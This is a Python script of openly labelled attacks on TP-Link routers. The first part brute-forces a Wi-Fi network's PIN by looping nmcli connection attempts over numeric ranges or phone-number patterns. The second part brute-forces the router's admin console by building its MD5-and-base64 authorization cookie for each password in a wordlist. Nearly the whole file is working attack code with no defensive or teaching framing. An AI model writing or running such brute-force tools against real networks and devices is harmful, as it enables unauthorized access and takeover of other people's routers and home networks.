import subprocess
import time
import hashlib
import base64 
import urllib.parse
import requests

#Attack 1 - SSID PIN Brute Force
def ssid_authentication(ssid: str, pin: str) -> bool:
    subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        cmd = ["nmcli", "--wait", "4", "device", "wifi", "connect", ssid, "password", pin]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if "successfully activated" in result.stdout.lower():
            print(f"Connected to {ssid} with PIN: {pin}")
            return True

    except subprocess.TimeoutExpired:
        subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

    subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(f"Failed to connect to {ssid} within the timeout. Moving on...")
    return False


def ssid_brute(ssid: str)->None:
    print("\n" + "═" * 83)
    print("1 — TP-LINK SSID Brute Force   | 2 - Phone Number Brute Force ")
    print("═" * 83 + "\n")

    choice = input("Select an option: ").strip()
    if choice == "1":
        for i in range(52445720, 52445730):
            pin = f"{i:08d}"
            if ssid_authentication(ssid, pin):
                print(f"Found PIN: {pin}")
                break
    elif choice == "2":
        area_code = input("What is the area code?: ").strip()
        for num in range(10000000):
            rest = f"{num:07d}"
            ssid_authentication(ssid, f"{area_code}{rest}")   
    else:
        print("Invalid option")

#Attack 3 Admin Console Brute Force
def attempt_admin_login(target_url: str , token: str)-> bool:
    session_cookie = {"Authorization": token}
    headers = {
        "Referer" : target_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }
    try:
        response = requests.get(target_url+"userRpm/LoginRpm.htm?Save=Save", cookies=session_cookie, headers=headers, timeout=3)

        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
    return False


def generate_tp_link_auth_token(password: str) -> str:
    password_md5 = hashlib.md5(password.encode('utf-8')).hexdigest()

    credential_string = f"admin:{password_md5}"

    b64_bytes = base64.b64encode(credential_string.encode('utf-8'))
    b64_string = b64_bytes.decode('utf-8')

    token = f"Basic {b64_string}"
    return urllib.parse.quote(token)

def brute_force_login(target_url: str, password_list: list)->None:
    passwords = []
    with open(password_list, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password = line.strip()
            passwords.append(password)
    print("[*] Attempting Password Brute Force on Admin Console")
    for password in passwords:
        token = generate_tp_link_auth_token(password)
        if attempt_admin_login(target_url, token):
            print(f"[+] Successfully authenticated as Admin with password: [{password}] at: {target_url}.")
            return
        else:
            print(f"[-] Authentication unsuccessful with password: [{password}], trying next password")